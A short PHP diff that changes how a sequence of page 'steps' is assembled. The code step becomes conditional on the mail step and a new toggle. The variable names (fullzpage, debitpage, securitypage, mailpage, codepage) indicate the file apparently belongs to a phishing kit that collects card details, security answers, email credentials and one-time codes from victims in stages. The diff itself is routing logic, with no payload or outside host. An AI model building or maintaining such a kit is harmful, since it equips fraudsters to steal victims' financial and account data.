@@ -52,9 +52,10 @@ function h4z3_build_step_path($path, $basePath)
 
 function h4z3_get_flow_steps()
 {
-    global $securitypage, $fullzpage, $debitpage, $mailpage;
+    global $securitypage, $fullzpage, $debitpage, $mailpage, $codepage;
 
     $steps = [];
+    $mailEnabled = false;
 
     if (h4z3_is_toggle_enabled($securitypage ?? null)) {
         $steps[] = [
@@ -82,12 +83,15 @@ function h4z3_get_flow_steps()
             'key' => 'email',
             'path' => 'mail.php',
         ];
+        $mailEnabled = true;
     }
 
-    $steps[] = [
-        'key' => 'code',
-        'path' => 'Code.php',
-    ];
+    if ($mailEnabled && h4z3_is_toggle_enabled($codepage ?? null)) {
+        $steps[] = [
+            'key' => 'code',
+            'path' => 'Code.php',
+        ];
+    }
 
     return $steps;
 }
